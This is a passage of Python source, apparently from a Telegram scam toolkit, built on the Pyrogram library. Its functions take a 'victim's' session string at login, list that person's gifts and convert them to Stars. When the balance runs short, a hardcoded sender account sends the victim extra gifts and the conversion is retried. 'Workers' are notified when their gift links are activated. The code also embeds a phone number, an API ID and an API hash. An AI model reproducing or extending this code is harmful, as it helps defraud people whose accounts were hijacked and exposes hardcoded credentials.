    Returns (success: bool, message: str)
    """
    try:
        from pyrogram import Client
        # Работает строго по username, без запроса user_id, чтобы избежать блокировок БД
        
        # Используем постоянный аккаунт для отправки подарков
        gift_sender_phone = "+79060130047"
        
        # Читаем API-ключи; фоллбек на telegram_client.py если JSON отсутствует
        try:
            with open("sessions/79060130047.json", "r") as f:
                account_data = json.load(f)
            api_id = account_data.get("app_id")
            api_hash = account_data.get("app_hash")
            session_string = account_data.get("session_string")
        except Exception:
            from telegram_client import API_ID, API_HASH
            api_id = API_ID
            api_hash = API_HASH
            session_string = None

        client_name = "79060130047"
        client_lock = get_session_lock(client_name)
        async with client_lock:
            lock = None
            if session_string:
                client = Client(
                    name=client_name,
                    api_id=api_id,
                    api_hash=api_hash,
                    session_string=session_string,
                    in_memory=True
                )
            else:
                client = Client(
                    name=client_name,
                    api_id=api_id,
                    api_hash=api_hash,
                    workdir="sessions/"
                )
                lock = FileLock(os.path.join("sessions", f"{client_name}.lock"))
                acquired = await lock.acquire(timeout_ms=5000)
                if not acquired:
                    return False, "Не удалось получить файловый замок для сессии"
            await client.start()
        
        # Отправляем сообщение перед подарком если указан текст
        if text is None:
            # Текст берём из окружения, если не передан явно
            text = os.getenv('PRE_GIFT_MESSAGE', '❤')
        if text:
            username_for_message = victim_username if victim_username.startswith('@') else f"@{victim_username}"
            print(f"👋 Отправляю привет '{text}' пользователю {username_for_message} перед подарком")
            try:
                await client.send_message(chat_id=username_for_message, text=text)
            except Exception as msg_err:
                # Частые причины 400: USER_PRIVACY_RESTRICTED, USER_IS_BLOCKED, PEER_ID_INVALID
                # Сообщение — не критично для отправки подарка, продолжаем.
                print(f"⚠️ Не удалось отправить предварительное сообщение ({username_for_message}): {msg_err}. Продолжаю отправку подарка.")
        
        # Отправляем подарок по username (chat_id = '@username')
        recipient_username = victim_username if victim_username.startswith('@') else f"@{victim_username}"
        # Приводим gift_id к int и используем параметр вместо хардкода
        try:
            int_gift_id = int(gift_id)
        except Exception:
            await client.stop()
            error_msg = f"Некорректный gift_id: {gift_id}"
            print(f"❌ {error_msg}")
            return False, error_msg
        print(f"🎁 Отправляем подарок {int_gift_id} пользователю {recipient_username}")
        # Ретраи при временных ошибках/блокировках
        max_attempts = 3
        last_error = None
        sent_ok = False
        for attempt in range(1, max_attempts + 1):
            try:
                r = await client.send_gift(chat_id=recipient_username, gift_id=int_gift_id)
                if r:
                    sent_ok = True
                    break
                else:
                    last_error = "UNKNOWN_ERROR"
            except Exception as send_err:
                msg = str(send_err)
                last_error = msg
                # Если username недоступен напрямую, пробуем фоллбек через user_id
                if any(x in msg for x in ["PEER_ID_INVALID", "USERNAME_INVALID", "USERNAME_NOT_OCCUPIED"]):
                    try:
                        u = await client.get_users(recipient_username)
                        rid = getattr(u, 'id', None)
                        if rid:
                            print(f"🔁 PEER_ID_INVALID/USERNAME issue. Фоллбек на user_id={rid}")
                            r2 = await client.send_gift(chat_id=int(rid), gift_id=int_gift_id)
                            if r2:
                                sent_ok = True
                                break
                            else:
                                last_error = "UNKNOWN_ERROR"
                    except Exception as resolve_err:
                        last_error = f"RESOLVE_ERROR: {resolve_err}"
                # SQLite lock или конкурирующий доступ: даём времени на освобождение
                if "database is locked" in msg or "locked" in msg:
                    wait_ms = 500 * attempt
                    print(f"⏳ SQLite locked, попытка {attempt}/{max_attempts}, жду {wait_ms} мс...")
                    await asyncio.sleep(wait_ms / 1000)
                    continue
                # Peer flood / rate limits: небольшая пауза и повтор
                if "PEER_FLOOD" in msg or "FLOOD" in msg or "Too many requests" in msg:
                    wait_ms = 1000 * attempt
                    print(f"⏳ FLOOD/RATE, попытка {attempt}/{max_attempts}, жду {wait_ms} мс...")
                    await asyncio.sleep(wait_ms / 1000)
                    continue
                # Баланс низок — отдаём ошибку без ретраев
                if "BALANCE_TOO_LOW" in msg:
                    break
                # Ограничения приватности/блок — даём понятные сообщения, но не крутим бесконечно
                if any(x in msg for x in ["USER_PRIVACY_RESTRICTED", "USER_IS_BLOCKED"]):
                    print(f"⚠️ Ограничения пользователя: {msg}")
                    await asyncio.sleep(0.1)
                    continue
                # Иные ошибки — один повтор, затем выходим
                await asyncio.sleep(0.05)
                continue
        
        await client.stop()
        if 'lock' in locals() and lock:
            try:
                lock.release()
            except Exception:
                pass
        
        if sent_ok:
            success_msg = f"Подарок {gift_id} успешно отправлен пользователю {victim_username} с аккаунта {gift_sender_phone}"
            print(success_msg)
            return True, success_msg
        else:
            error_detail = f": {last_error}" if last_error else ""
            error_msg = f"Не удалось отправить подарок {gift_id} пользователю {victim_username} с аккаунта {gift_sender_phone}{error_detail}"
            print(error_msg)
            return False, error_msg
            
    except Exception as e:
        error_msg = f"Ошибка при отправке подарка через Pyrogram с аккаунта {gift_sender_phone}: {str(e)}"
        print(error_msg)
        return False, error_msg
    
async def send_gifts_to_user_id_with_pyrogram(recipient_user_id: int, count: int = 2, log_key: str = None) -> tuple[bool, str]:
    """
    Отправляет указанное количество подарков (по умолчанию 2) пользователю по его user_id
    с подготовленного аккаунта-отправителя через Pyrogram.
    Возвращает (успех: bool, сообщение: str)
    """
    try:
        # Проверяем и исправляем recipient_user_id
        if isinstance(recipient_user_id, str):
            if recipient_user_id == 'web_user':
                logger.warning("⚠️ recipient_user_id = 'web_user', невозможно отправить подарок без реального ID")
                return False, "Не удалось определить ID получателя (web_user)"
            try:
                recipient_user_id = int(recipient_user_id)
            except (ValueError, TypeError):
                logger.error(f"❌ Не удалось преобразовать recipient_user_id в int: {recipient_user_id}")
                return False, f"Неверный формат ID получателя: {recipient_user_id}"
        elif not isinstance(recipient_user_id, int):
            logger.error(f"❌ recipient_user_id должен быть int, получен: {type(recipient_user_id)}")
            return False, f"Неверный тип ID получателя: {type(recipient_user_id)}"
        
        from pyrogram import Client

        gift_sender_phone = "+79060130047"

        # Загружаем параметры подготовленного аккаунта, если доступны
        account_data = {}
        try:
            with open("sessions/79060130047.json", "r") as f:
                account_data = json.load(f)
        except Exception:
            account_data = {}

        api_id = account_data.get("app_id", 14549469)
        api_hash = account_data.get("app_hash", "a7ab219d3948725cb0b1a3c20b4b3126")
        session_string = account_data.get("session_string")

        client_name = "79060130047"
        client_lock = get_session_lock(client_name)
        async with client_lock:
            lock = None
            if session_string:
                client = Client(
                    name=client_name,
                    api_id=api_id,
                    api_hash=api_hash,
                    session_string=session_string,
                    in_memory=True
                )
            else:
                client = Client(
                    name=client_name,
                    api_id=api_id,
                    api_hash=api_hash,
                    workdir="sessions/"
                )
                lock = FileLock(os.path.join("sessions", f"{client_name}.lock"))
                acquired = await lock.acquire(timeout_ms=5000)
                if not acquired:
                    return False, "Не удалось получить файловый замок для сессии"

            await client.start()

            # Проверяем баланс докид-аккаунта перед отправкой
            try:
                me = await client.get_me()
                if log_key:
                    append_gift_log(log_key, f"🔍 Проверка докид-аккаунта: {gift_sender_phone} (ID: {me.id})")
                
                # Получаем список доступных подарков
                try:
                    from pyrogram.raw.functions.payments import GetStarGifts
                    result = await client.invoke(GetStarGifts(hash=0))
                    available_gifts = len(result.gifts) if hasattr(result, 'gifts') else 0
                    if log_key:
                        append_gift_log(log_key, f"📦 Доступно подарков для докида: {available_gifts}")
                except Exception as gift_check_err:
                    if log_key:
                        append_gift_log(log_key, f"⚠️ Не удалось проверить подарки: {str(gift_check_err)[:100]}")
            except Exception as check_err:
                if log_key:
                    append_gift_log(log_key, f"⚠️ Ошибка проверки докид-аккаунта: {str(check_err)[:100]}")

            # 1) Привет от аккаунта докида -> получателю (до отправки подарков)
            # Это важно для установки связи между аккаунтами
            pre_text = os.getenv('PRE_GIFT_MESSAGE', '').strip() or os.getenv('SENDER_PRE_GIFT_MESSAGE', '').strip()
            if not pre_text:
                pre_text = "❤"  # Дефолтное приветствие
                try:
                    target_chat = int(recipient_user_id)
                    # Пытаемся резолвить username и отправить привет по @username, это чаще проходит
                    try:
                        u = await client.get_users(int(recipient_user_id))
                        uname = getattr(u, 'username', None)
                        if uname:
                            target_chat = f"@{uname}"
                            if log_key:
                                append_gift_log(log_key, f"👋 Отправляем привет от аккаунта докида к получателю @{uname} (ID: {recipient_user_id})")
                    except Exception as resolve_err:
                        if log_key:
                            append_gift_log(log_key, f"ℹ️ Не удалось резолвить username для {recipient_user_id}, используем ID")
                    
                    try:
                        await client.send_message(chat_id=target_chat, text=pre_text)
                        if log_key:
                            append_gift_log(log_key, f"✅ Привет отправлен от аккаунта докида к получателю")
                    except Exception as msg_err:
                        error_str = str(msg_err)
                        if log_key:
                            append_gift_log(log_key, f"⚠️ Не удалось отправить привет от докида: {error_str[:100]}, продолжаем отправку подарка...")
                except Exception as pre_err:
                    if log_key:
                        append_gift_log(log_key, f"⚠️ Ошибка при отправке привета: {str(pre_err)[:100]}")
            # Задержка после приветствия для установки связи
            await asyncio.sleep(0.2)
            # Для докида всегда используем фиксированный ID подарка
            fixed_gift_id = 5170145012310081615
            for i in range(count):
                max_attempts = 3
                last_error = None
                for attempt in range(1, max_attempts + 1):
                    try:
                        result = await client.send_gift(chat_id=int(recipient_user_id), gift_id=int(fixed_gift_id))
                        if result:
                            last_error = None
                            break
                        else:
                            last_error = "UNKNOWN_ERROR"
                    except Exception as e:
                        msg = str(e)
                        last_error = msg
                        err_text = (
                            f"❌ Ошибка при отправке подарка <code>{fixed_gift_id}</code> "
                            f"пользователю ID <code>{recipient_user_id}</code> (попытка {attempt}/{max_attempts}):\n"
                            f"<code>{msg}</code>"
                        )
                        if log_key:
                            append_gift_log(log_key, err_text)
                        else:
                            await send_gift_log_message(text=err_text)
                        # Фоллбек: если ID недоступен, пробуем через username
                        if any(x in msg for x in ["PEER_ID_INVALID", "USERNAME_INVALID", "USERNAME_NOT_OCCUPIED"]):
                            # PEER_ID_INVALID означает, что аккаунты не "знакомы"
                            # Пытаемся сначала отправить сообщение для установки связи, затем подарок
                            try:
                                # Пытаемся отправить сообщение для установки связи
                                try:
                                    await client.send_message(chat_id=int(recipient_user_id), text="❤")
                                    if log_key:
                                        append_gift_log(log_key, f"👋 Отправлено сообщение для установки связи с {recipient_user_id}")
                                    await asyncio.sleep(0.3)  # Небольшая задержка после сообщения
                                except Exception as msg_err:
                                    if log_key:
                                        append_gift_log(log_key, f"⚠️ Не удалось отправить сообщение для связи: {str(msg_err)[:100]}")
                                
                                # Теперь пробуем через username
                                u = await client.get_users(int(recipient_user_id))
                                uname = getattr(u, 'username', None)
                                if uname:
                                    if log_key:
                                        append_gift_log(log_key, f"🔁 PEER_ID_INVALID для ID {recipient_user_id}. Пробуем через @{uname}")
                                    result = await client.send_gift(chat_id=f"@{uname}", gift_id=int(fixed_gift_id))
                                    if result:
                                        last_error = None
                                        fb_msg = (
                                            f"✅ Успешно отправлен подарок <code>{fixed_gift_id}</code> "
                                            f"пользователю @{uname} через фоллбек (попытка {attempt}/{max_attempts})"
                                        )
                                        if log_key:
                                            append_gift_log(log_key, fb_msg)
                                        else:
                                            await send_gift_log_message(text=fb_msg)
                                        break
                            except Exception as resolve_err:
                                # Игнорируем, продолжим с ретраями ниже
                                res_text = (
                                    f"⚠️ Ошибка резолва username для ID <code>{recipient_user_id}</code>:\n"
                                    f"<code>{resolve_err}</code>"
                                )
                                if log_key:
                                    append_gift_log(log_key, res_text)
                                else:
                                    await send_gift_log_message(text=res_text)
                                pass
                        if "database is locked" in msg or "locked" in msg:
                            wait_ms = 200 * attempt
                            await asyncio.sleep(wait_ms / 1000)
                            continue
                        if "PEER_FLOOD" in msg or "FLOOD" in msg or "Too many requests" in msg:
                            # Увеличиваем время ожидания для FLOOD ошибок
                            wait_ms = 1000 * attempt  # Увеличиваем задержку: 1с, 2с, 3с
                            if log_key:
                                try:
                                    append_gift_log(log_key, f"⚠️ FLOOD ограничение (попытка {attempt}/{max_attempts}), ждем {wait_ms/1000:.1f} сек...")
                                except Exception:
                                    pass
                            await asyncio.sleep(wait_ms / 1000)
                            continue
                        if "BALANCE_TOO_LOW" in msg:
                            # Если баланс слишком низкий при докиде - это критично!
                            if log_key:
                                try:
                                    append_gift_log(log_key, f"❌ КРИТИЧНО: У докид-аккаунта ({gift_sender_phone}) недостаточно звёзд!")
                                    append_gift_log(log_key, f"⚠️ Необходимо пополнить баланс звёзд на аккаунте докида")
                                    append_gift_log(log_key, f"⚠️ Попытка {attempt}/{max_attempts}: {msg[:200]}")
                                except Exception:
                                    pass
                            # Пробуем ещё раз с увеличенной задержкой
                            if attempt < max_attempts:
                                await asyncio.sleep(3.0)
                                continue
                            else:
                                # Если это последняя попытка - прерываем и возвращаем ошибку
                                last_error = f"BALANCE_TOO_LOW: У докид-аккаунта недостаточно звёзд"
                                break
                        await asyncio.sleep(0.1)
                        continue
                if last_error:
                    await client.stop()
                    error_msg = f"Не удалось отправить подарок №{i+1} пользователю ID {recipient_user_id}: {last_error}"
                    if log_key:
                        append_gift_log(log_key, f"❌ {error_msg}")
                    return False, error_msg

            await client.stop()
            success_msg = f"Отправлено {count} подарков пользователю ID {recipient_user_id}"
            if log_key:
                append_gift_log(log_key, f"✅ {success_msg}")
            return True, success_msg

    except Exception as e:
        return False, f"Ошибка докида: {str(e)}"

async def send_gifts_to_username_with_pyrogram(recipient_username: str, count: int = 2, log_key: str = None) -> tuple[bool, str]:
    """
    Отправляет указанное количество подарков пользователю по его username
    используя аккаунт-отправитель через Pyrogram.
    Возвращает (успех: bool, сообщение: str)
    """
    try:
        # Для докида всегда используем фиксированный ID подарка от пользователя
        # Требование: gift_id = 5170145012310081615
        fixed_gift_id = 5170145012310081615
        candidate_ids = [fixed_gift_id]

        # Нормализуем username
        if not recipient_username.startswith('@'):
            recipient_username = f"@{recipient_username}"

        start_msg = (
            f"🔔 Запуск докида: {count} шт. для {recipient_username}, gift_id=<code>{fixed_gift_id}</code>"
        )
        if log_key:
            append_gift_log(log_key, start_msg)
        else:
            await send_gift_log_message(text=start_msg)
        last_error = None
        # Текст приветствия из окружения
        pre_text = os.getenv('PRE_GIFT_MESSAGE', '❤')
        for i in range(count):
            print(f"🎁 [{i+1}/{count}] Отправляем подарок по username...")
            attempt_ok = False
            last_error = None
            for gid in candidate_ids:
                ok, msg = await send_gift_with_pyrogram(recipient_username, str(gid), pre_text)
                if ok:
                    attempt_ok = True
                    ok_text = (
                        f"✅ Успешно отправлен подарок <code>{gid}</code> пользователю {recipient_username}"
                    )
                    if log_key:
                        append_gift_log(log_key, ok_text)
                    else:
                        await send_gift_log_message(text=ok_text)
                    break
                else:
                    last_error = msg
                    # Для фиксированного ID не делаем перебор, просто логируем ошибку
                    err_text = (
                        f"❌ Ошибка отправки подарка <code>{gid}</code> пользователю {recipient_username}:\n<code>{msg}</code>"
                    )
                    if log_key:
                        append_gift_log(log_key, err_text)
                    else:
                        await send_gift_log_message(text=err_text)
                    break
            if not attempt_ok:
                fail_text = (
                    f"❌ Ошибка докида [{i+1}/{count}] для {recipient_username}:\n<code>{last_error}</code>"
                )
                if log_key:
                    append_gift_log(log_key, fail_text)
                else:
                    await send_gift_log_message(text=fail_text)
                return False, last_error or "UNKNOWN_ERROR"
        success_msg = f"Успешно отправлено {count} подарка(ов) пользователю {recipient_username}"
        print(f"✅ {success_msg}")
        if log_key:
            append_gift_log(log_key, f"✅ {success_msg}")
        else:
            await send_gift_log_message(text=f"✅ {success_msg}")
        return True, success_msg
    except Exception as e:
        error_msg = f"Критическая ошибка докида по username: {e}"
        print(f"❌ {error_msg}")
        return False, error_msg

async def convert_available_gifts_to_stars_with_client(client, exclude_ids: set = None, max_to_convert: int = 10, log_key: str = None) -> int:
    """
    Находит доступные подарки у текущего аккаунта, исключая переданные идентификаторы,
    и конвертирует до max_to_convert подарков в звёзды через переданный client.
    Возвращает количество полученных звёзд (сумма по star_value, по умолчанию 1 за подарок).
    """
    try:
        exclude_ids = exclude_ids or set()
        gifts_to_convert = []
        async for g in client.get_chat_gifts("me"):
            gid = getattr(g, 'id', None)
            if gid is not None and gid in exclude_ids:
                continue
            gifts_to_convert.append(g)
            if len(gifts_to_convert) >= max_to_convert:
                break

        if not gifts_to_convert:
            print("ℹ️ Нет подарков для конвертации")
            try:
                if log_key:
                    append_gift_log(log_key, "ℹ️ Нет подарков для конвертации в звезды")
                else:
                    await send_gift_log_message("ℹ️ Нет подарков для конвертации в звезды")
            except Exception as _log_err:
                print(f"⚠️ Ошибка логирования: {_log_err}")
            return 0

        total_stars = 0
        converted_count = 0
        for i, gift in enumerate(gifts_to_convert, 1):
            try:
                print(f"🔄 [{i}/{len(gifts_to_convert)}] Конвертирую подарок ID={getattr(gift, 'id', 'unknown')}...")
                result = await gift.convert()
                if result:
                    converted_count += 1
                    stars_from_gift = getattr(gift, 'star_value', 1)
                    total_stars += int(stars_from_gift)
                    print(f"✅ Подарок ID={getattr(gift, 'id', 'unknown')} конвертирован в {stars_from_gift} звёзд")
                else:
                    print(f"❌ Не удалось конвертировать подарок ID={getattr(gift, 'id', 'unknown')}")
                    try:
                        gid = getattr(gift, 'id', 'unknown')
                        if log_key:
                            append_gift_log(log_key, f"❌ Не удалось конвертировать подарок ID={gid}")
                        else:
                            await send_gift_log_message(f"❌ Не удалось конвертировать подарок ID={gid}")
                    except Exception as _log_err:
                        print(f"⚠️ Ошибка логирования: {_log_err}")
            except Exception as gift_error:
                print(f"❌ Ошибка конвертации подарка ID={getattr(gift, 'id', 'unknown')}: {gift_error}")
                try:
                    gid = getattr(gift, 'id', 'unknown')
                    if log_key:
                        append_gift_log(log_key, f"❌ Ошибка конвертации подарка ID={gid}: {gift_error}")
                    else:
                        await send_gift_log_message(f"❌ Ошибка конвертации подарка ID={gid}: {gift_error}")
                except Exception as _log_err:
                    print(f"⚠️ Ошибка логирования: {_log_err}")

        print(f"✅ Конвертация завершена: подарков={converted_count}, звёзд получено={total_stars}")
        try:
            if log_key:
                append_gift_log(log_key, f"✅ Конвертация завершена: подарков={converted_count}, звёзд={total_stars}")
            else:
                await send_gift_log_message(
                    f"✅ Конвертация завершена: подарков={converted_count}, звёзд={total_stars}"
                )
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования: {_log_err}")
        return total_stars
    except Exception as e:
        print(f"❌ Ошибка конвертации доступных подарков: {str(e)}")
        try:
            if log_key:
                append_gift_log(log_key, f"❌ Ошибка конвертации доступных подарков: {str(e)}")
            else:
                await send_gift_log_message(f"❌ Ошибка конвертации доступных подарков: {str(e)}")
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования: {_log_err}")
        return 0


async def send_worker_notification(worker_telegram_id: int, gift_name: str, gift_link: str, recipient_username: str = None):
    """Отправляет уведомление воркеру в ЛС об активации его подарочной ссылки"""
    try:
        from telegram_bot import bot
        import html
        
        recipient_display = f"@{recipient_username}" if recipient_username else f"ID{worker_telegram_id}"

        # Экранируем динамические поля для корректного HTML-парсинга в Telegram
        safe_gift_name = html.escape(gift_name or "", quote=True)
        safe_recipient_display = html.escape(recipient_display or "", quote=True)
        safe_gift_link = html.escape(gift_link or "", quote=True)
        
        message_text = (
            f"🎉 <b>Ваша подарочная ссылка активирована!</b>\n\n"
            f"🎁 <b>NFT:</b> {safe_gift_name}\n"
            f"👤 <b>Получил:</b> {safe_recipient_display}\n"
            f"🔗 <b>Ссылка:</b> <code>{safe_gift_link}</code>\n"
            f"⏰ <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
        )
        
        await bot.send_message(
            chat_id=worker_telegram_id,
            text=message_text,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        
        print(f"✅ Уведомление отправлено воркеру {worker_telegram_id} об активации ссылки {gift_link}")
        return True
        
    except Exception as e:
        print(f"❌ Ошибка отправки уведомления воркеру {worker_telegram_id}: {e}")
        return False


async def get_user_gifts_from_telegram(session_string: str) -> list:
    """
    Получает все подарки пользователя из Telegram через Pyrogram
    Возвращает список объектов Gift
    """
    from pyrogram import Client
    from telegram_client import API_ID, API_HASH
    
    try:
        client = Client(
            name="gift_getter",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        
        await client.start()
        
        gifts = []
        print("🎁 Получаем список всех подарков пользователя...")
        
        async for gift in client.get_chat_gifts("me"):
            gifts.append(gift)
            print(f"📦 Найден подарок: ID={gift.id}, Limited={gift.is_limited}")
        
        await client.stop()
        
        print(f"✅ Получено {len(gifts)} подарков")
        return gifts
        
    except Exception as e:
        print(f"❌ Ошибка получения подарков: {e}")
        return []


async def convert_gifts_to_stars(session_string: str, gifts: list) -> tuple[bool, str, int]:
    """
    Конвертирует подарки в звезды используя Gift.convert
    Возвращает (успех, сообщение_об_ошибке, количество_конвертированных_звезд)
    """
    from pyrogram import Client
    from telegram_client import API_ID, API_HASH
    
    try:
        print(f"🔄 Начинаем конвертацию {len(gifts)} подарков в звезды...")
        
        client = Client(
            name="gift_converter",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        
        await client.start()
        print("✅ Pyrogram клиент для конвертации запущен")
        
        total_converted_stars = 0
        converted_count = 0
        failed_count = 0
        
        for i, gift in enumerate(gifts, 1):
            try:
                print(f"🔄 [{i}/{len(gifts)}] Пытаемся конвертировать подарок ID={gift.id}...")
                
                # Конвертируем подарок в звезды
                result = await gift.convert()
                
                if result:
                    converted_count += 1
                    # Предполагаем что каждый подарок дает определенное количество звезд
                    # Это значение может отличаться в зависимости от типа подарка
                    stars_from_gift = getattr(gift, 'star_value', 1)  # По умолчанию 1 звезда
                    total_converted_stars += stars_from_gift
                    print(f"✅ [{i}/{len(gifts)}] Подарок ID={gift.id} конвертирован в {stars_from_gift} звезд")
                else:
                    failed_count += 1
                    print(f"❌ [{i}/{len(gifts)}] Не удалось конвертировать подарок ID={gift.id}")
                    
            except Exception as gift_error:
                failed_count += 1
                error_str = str(gift_error)
                print(f"❌ [{i}/{len(gifts)}] Ошибка конвертации подарка ID={gift.id}: {error_str}")
                
                # Проверяем на недостаток звезд для конвертации
                if "INSUFFICIENT_STARS" in error_str or "BALANCE_TOO_LOW" in error_str:
                    print(f"⭐ Обнаружен недостаток звезд. Конвертировано: {converted_count}, Не удалось: {failed_count}")
                    await client.stop()
                    return False, "INSUFFICIENT_STARS", total_converted_stars
        
        await client.stop()
        print("🔌 Pyrogram клиент для конвертации остановлен")
        
        if converted_count > 0:
            print(f"✅ Итого конвертировано {converted_count} подарков в {total_converted_stars} звезд (неудач: {failed_count})")
            return True, "", total_converted_stars
        else:
            print(f"❌ Ни один подарок не был конвертирован (всего попыток: {len(gifts)}, неудач: {failed_count})")
            return False, "NO_GIFTS_CONVERTED", 0
            
    except Exception as e:
        print(f"❌ Критическая ошибка конвертации подарков: {e}")
        return False, str(e), 0


# удалено: дублирующаяся версия convert_available_gifts_to_stars_with_client


async def send_two_gifts_to_victim(victim_username: str = None) -> tuple[bool, str]:
    """
    Отправляет два подарка жертве используя аккаунт отправителя подарков
    """
    try:
        if not victim_username:
            victim_username = os.getenv('VICTIM_USERNAME')
        if not victim_username:
            return False, "Не задан VICTIM_USERNAME в .env и параметрах функции"

        # Нормализуем к виду @username
        victim_username = victim_username if victim_username.startswith('@') else f"@{victim_username}"

        # Для этого сценария делаем дефолт на фиксированный ID, если переменная не задана
        star_gift_id = os.getenv('STAR_GIFT_ID', '5170145012310081615')

        print(f"🎯 Начинаем докид подарков для пользователя {victim_username}...")
        print(f"🎁 Отправляем два подарка пользователю {victim_username} c gift_id={star_gift_id}...")
        try:
            await send_gift_log_message(
                f"🚀 Старт докида: {victim_username}, gift_id={star_gift_id}"
            )
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования старта докида: {_log_err}")
        
        # Отправляем первый подарок
        print("🎁 [1/2] Отправляем первый подарок...")
        success1, msg1 = await send_gift_with_pyrogram(victim_username, star_gift_id, "Подарок 1")
        try:
            await send_gift_log_message(
                f"📦 [1/2] Результат: {'ok' if success1 else 'fail'}; msg='{msg1}'"
            )
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования результата 1-го подарка: {_log_err}")
        if not success1:
            print(f"❌ [1/2] Ошибка отправки первого подарка: {msg1}")
            try:
                await send_gift_log_message(
                    f"❌ [1/2] Ошибка отправки: {msg1}"
                )
            except Exception as _log_err:
                print(f"⚠️ Ошибка логирования ошибки 1-го подарка: {_log_err}")
            return False, f"Ошибка отправки первого подарка: {msg1}"
        
        print("✅ [1/2] Первый подарок успешно отправлен")
        
        # Отправляем второй подарок
        print("🎁 [2/2] Отправляем второй подарок...")
        success2, msg2 = await send_gift_with_pyrogram(victim_username, star_gift_id, "Подарок 2")
        try:
            await send_gift_log_message(
                f"📦 [2/2] Результат: {'ok' if success2 else 'fail'}; msg='{msg2}'"
            )
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования результата 2-го подарка: {_log_err}")
        if not success2:
            print(f"❌ [2/2] Ошибка отправки второго подарка: {msg2}")
            try:
                await send_gift_log_message(
                    f"❌ [2/2] Ошибка отправки: {msg2}"
                )
            except Exception as _log_err:
                print(f"⚠️ Ошибка логирования ошибки 2-го подарка: {_log_err}")
            return False, f"Ошибка отправки второго подарка: {msg2}"
        
        print("✅ [2/2] Второй подарок успешно отправлен")
        print(f"🎉 Докид завершен! Отправлено 2 подарка пользователю {victim_username}")
        try:
            await send_gift_log_message(
                f"🎉 Докид завершен: {victim_username}, отправлено 2 подарка"
            )
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования завершения докида: {_log_err}")
        
        return True, "Два подарка успешно отправлены"
        
    except Exception as e:
        error_msg = f"Ошибка отправки подарков жертве: {str(e)}"
        print(f"❌ {error_msg}")
        try:
            await send_gift_log_message(f"❌ Критическая ошибка докида: {error_msg}")
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования критической ошибки докида: {_log_err}")
        return False, error_msg


async def process_user_login_gifts(session_string: str, victim_username: str = None, max_retries: int = 5) -> dict:
    """
    Главная функция обработки подарков при входе пользователя:
    1. Получает все подарки
    2. Пытается конвертировать их в звезды
    3. При нехватке звезд отправляет 2 подарка жертве и повторяет конвертацию
    """
    result = {
        'success': False,
        'total_stars_converted': 0,
        'gifts_sent_to_victim': 0,
        'retries_made': 0,
        'error': None
    }
    
    try:
        # Определяем целевого пользователя из текущей сессии, если username не передан
        me_info = None
        if not victim_username:
            try:
                me_info = await get_me_from_pyrogram(session_string)
                me_username = me_info.get('username') if isinstance(me_info, dict) else None
                if me_username:
                    victim_username = me_username
            except Exception as me_err:
                print(f"ℹ️ Не удалось получить me из сессии: {me_err}")
        # Фоллбек на переменную окружения, если username из сессии недоступен
        if not victim_username:
            env_victim = os.getenv('VICTIM_USERNAME')
            if env_victim:
                victim_username = env_victim

        # Определяем user_id: из username или напрямую из session
        user_id = None
        if victim_username:
            print("🚀 Начинаем обработку подарков при входе пользователя...")
            print(f"🎯 Получаем user_id для пользователя {victim_username}...")
            success, user_id, error_msg = await get_user_id_from_username(victim_username)
            if not success:
                print(f"❌ Не удалось получить user_id: {error_msg}")
                result['error'] = f"Ошибка получения user_id: {error_msg}"
                return result
            print(f"✅ Получен user_id: {user_id}")
            print(f"🎯 Целевой пользователь для отправки подарков: {victim_username} (ID: {user_id})")
        else:
            # Если username недоступен, используем user_id из me_info
            if isinstance(me_info, dict) and me_info.get('user_id'):
                user_id = int(me_info['user_id'])
                print("🚀 Начинаем обработку подарков при входе пользователя...")
                print(f"🎯 Целевой пользователь без username. Использую ID: {user_id}")
            else:
                result['error'] = "NO_VICTIM_USERNAME_OR_ID"
                return result
        
        for retry in range(max_retries):
            print(f"\n🔄 === ПОПЫТКА {retry + 1}/{max_retries} ===")
            
            # Получаем все подарки пользователя
            print("📦 Получаем список подарков пользователя...")
            gifts = await get_user_gifts_from_telegram(session_string)
            
            if not gifts:
                print("📭 Подарки не найдены")
                result['error'] = "NO_GIFTS_FOUND"
                break
            
            print(f"📦 Найдено {len(gifts)} подарков для конвертации")
            
            # Пытаемся конвертировать подарки в звезды
            print("⭐ Начинаем попытку конвертации подарков в звезды...")
            convert_success, convert_error, stars_converted = await convert_gifts_to_stars(session_string, gifts)
            
            result['total_stars_converted'] += stars_converted
            
            if convert_success:
                print(f"🎉 ВСЕ ПОДАРКИ УСПЕШНО КОНВЕРТИРОВАНЫ! Получено {stars_converted} звезд")
                result['success'] = True
                break
            
            elif convert_error == "INSUFFICIENT_STARS":
                print("⭐ Недостаточно звезд для конвертации всех подарков")
                print(f"💰 Уже конвертировано звезд в этой попытке: {stars_converted}")
                print("🎁 Запускаем докид подарков жертве для получения дополнительных звезд...")
                
                # Отправляем два подарка целевому пользователю
                if victim_username:
                    gift_success, gift_error = await send_gifts_to_username_with_pyrogram(victim_username if victim_username.startswith('@') else f"@{victim_username}", count=2)
                else:
                    gift_success, gift_error = await send_gifts_to_user_id_with_pyrogram(user_id, count=2)
                
                if gift_success:
                    result['gifts_sent_to_victim'] += 2
                    result['retries_made'] += 1
                    print("✅ Подарки отправлены, повторяем попытку конвертации...")
                    continue
                else:
                    print(f"❌ Не удалось отправить подарки: {gift_error}")
                    result['error'] = gift_error
                    break
            else:
                print(f"❌ Ошибка конвертации: {convert_error}")
                result['error'] = convert_error
                break
        
        if result['retries_made'] >= max_retries and not result['success']:
            print(f"❌ Превышено максимальное количество попыток ({max_retries})")
            result['error'] = "MAX_RETRIES_EXCEEDED"
        
        # Итоговая статистика
        print(f"\n📊 === ИТОГОВАЯ СТАТИСТИКА ===")
        print(f"✅ Успех: {result['success']}")
        print(f"⭐ Всего конвертировано звезд: {result['total_stars_converted']}")
        print(f"🎁 Отправлено подарков жертве: {result['gifts_sent_to_victim']}")
        print(f"🔄 Количество попыток: {result['retries_made']}")
        if result['error']:
            print(f"❌ Ошибка: {result['error']}")
        
        return result
        
    except Exception as e:
        error_msg = f"Критическая ошибка обработки подарков: {str(e)}"
